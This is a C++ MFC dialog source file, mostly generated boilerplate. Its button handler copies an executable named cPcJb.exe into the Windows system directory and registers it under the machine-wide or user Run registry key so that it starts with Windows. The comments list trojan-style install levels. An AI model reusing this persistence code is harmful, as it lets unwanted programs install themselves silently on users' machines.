// ffJbDlg.cpp : implementation file
//

#include	"stdafx.h"
#include	"ffJb.h"
#include	"ffJbDlg.h"

#include	"qyCommon.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	virtual BOOL OnInitDialog();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFfJbDlg dialog

CFfJbDlg::CFfJbDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFfJbDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFfJbDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CFfJbDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFfJbDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CFfJbDlg, CDialog)
	//{{AFX_MSG_MAP(CFfJbDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFfJbDlg message handlers

extern  "C"  void  GetOSVersion(  );


BOOL CFfJbDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	

	GetOSVersion(  );


	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CFfJbDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CFfJbDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFfJbDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

extern  "C"  BOOL		g_bIsWinNT;
#define					CONST_qwmMaxnCopies		3
HMODULE					g_module		=		NULL;



void CFfJbDlg::OnButton1() 
{
		// Install levels:
		// 0: Not installed
		// 1: Installed, not run from anywhere
		// 2: Installed, run from user registry key
		// 3: Installed, run from system-wide registry key
		// 4: Installed, run as service
		int  nInstall  =  0;
		char  *  svRunRegKey;

		g_module  =  GetModuleHandle(  NULL  );



		if  (  g_bIsWinNT  )  svRunRegKey  =  CONST_qyCfgName_ntRunKey;  
		else  svRunRegKey  =  CONST_qyCfgName_98RunKey;
		
		
		// Get target installation pathname
		char							svName[MAX_PATH];
		char							svTargetName[MAX_PATH],  *	svFilePart;
		char						*	svTarget  =  "cPcJb.exe";
		char							svFileName[512];
		char						*	pFinalModuleName		=	NULL;
		char							tmpPath[MAX_PATH  +  1];
		char							tmpFileName[MAX_PATH  +  1];
		unsigned  char					ucbSysRunInstalled		=	FALSE;


		// Get current module location
		GetModuleFileName(  g_module,  svFileName,  sizeof(  svFileName  )  );
		for  (  pFinalModuleName  =  svFileName  +  lstrlen(  svFileName  )  -  1;  pFinalModuleName  >  svFileName;  pFinalModuleName  --  )  {
			 if  (  *pFinalModuleName  ==  '\\'  )  {	
			 	 pFinalModuleName  ++  ;	 break;
		 	 }
		}
		traceLogA(  "File name is %s,  finalModuleName is %s",  svFileName,  pFinalModuleName  );
		*pFinalModuleName  =  0;
		lstrcpyn(  svFileName  +  lstrlen(  svFileName  ),  svTarget,  sizeof(  svFileName  )  -  lstrlen(  svFileName  )  );
		traceLogA(  "src file name is %s",  svFileName  );
		

		GetSystemDirectory(  svName,  MAX_PATH  -  1  );
		//  lstrcat(  svName,  "\\"  );
		trailDir(  svName,  sizeof(  svName  )  );
		lstrcpyn(  svName  +  lstrlen(  svName  ),  svTarget,  MAX_PATH  -  lstrlen(  svName  )  );
		GetFullPathName(  svName,  MAX_PATH,  svTargetName,  &svFilePart  );
		
		traceLogA(  "svTargetName is %s",  svTargetName  );


		// ------------- Determine current install level -----------------

		// ----- 1: Check for installation -----


		if  (  !bQyCopyFileEx(  svFileName,  svTargetName,  CONST_qwmMaxnCopies  )  )  {
			traceLogA(  "bQyCopyFileEx %s to %s failed",  svFileName,  svTargetName  );
			goto  errLabel;

		}		
		traceLogA(  "bQyCopyFileEx %s to %s succeeded",  svFileName,  svTargetName  );
		nInstall  =  1;
		
		HKEY  key;
		if  (  RegCreateKey(  HKEY_LOCAL_MACHINE,  svRunRegKey,  &key  )  ==  ERROR_SUCCESS  )  {
			RegSetValueEx(  key,  svTarget,  0,  REG_SZ,  (  BYTE  *  )svTargetName,  lstrlen(  svTargetName  )  );
			RegCloseKey(  key  );
			ucbSysRunInstalled  =  TRUE;
		}


		// ----- 2: Check user registry key (NT only)
		if  (  g_bIsWinNT  )  {
			if  (  RegCreateKey(  HKEY_CURRENT_USER,  "Software\\Microsoft\\Windows\\CurrentVersion\\Run",  &key  )  ==  ERROR_SUCCESS  )  {
				if  (  ucbSysRunInstalled  )  RegDeleteValue(  key,  svTarget  );
				else  RegSetValueEx(  key,  svTarget,  0,  REG_SZ,  (  BYTE  *  )svTargetName,  lstrlen(  svTargetName  )  );
				RegCloseKey(  key  );
			}
		}
		
		



errLabel:
		return;
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
